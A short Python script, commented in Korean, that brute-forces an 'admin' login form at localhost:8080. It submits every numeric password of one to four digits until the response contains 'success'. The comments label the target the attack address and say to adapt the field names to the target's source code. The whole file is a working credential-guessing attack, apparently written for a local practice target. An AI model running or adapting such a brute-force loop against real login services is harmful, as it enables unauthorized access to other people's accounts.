import itertools
import requests

str = '0123456789' # bruteforce 문자열

for pwlen in range(1, 5):
    for password in itertools.product(str, repeat=pwlen):
        pw= ''.join(password)
        print(pw)
        loginpacket = {
            'id' : 'admin', # id/pw는 소스 code name에 맞추어 변경
            'pw' : pw,
        }
        address = requests.post('http://127.0.0.1:8080', data=loginpacket) # 공격 주소
        if address.text.find('success') > 0:
            exit()
        
        # Incorrect가 없는 경우 if address.text.find('Incorrect') == -1:
        # success될 경우 if address.text.find('success') > 0:


